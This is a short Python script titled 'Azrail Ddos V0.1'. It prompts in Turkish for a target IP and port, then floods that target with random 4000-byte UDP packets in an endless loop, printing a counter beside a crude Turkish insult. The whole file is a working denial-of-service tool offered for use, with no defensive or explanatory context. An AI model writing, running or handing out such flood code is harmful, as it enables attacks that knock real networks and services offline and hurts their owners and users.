import socket
import random
import os
os.system('cls')
banner="""
#################################
#Azrail Ddos V0.1
#Created by Athena
#################################

"""
print(banner)
ip = input('hedef ip')
port = input('hedef port')
bytes = random._urandom(4000)
sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
say=0
while True:
    sock.sendto(bytes,(ip,int(port)))
    say=say+1
    print('Adamın anasına sövülüyor:%s'%(say))
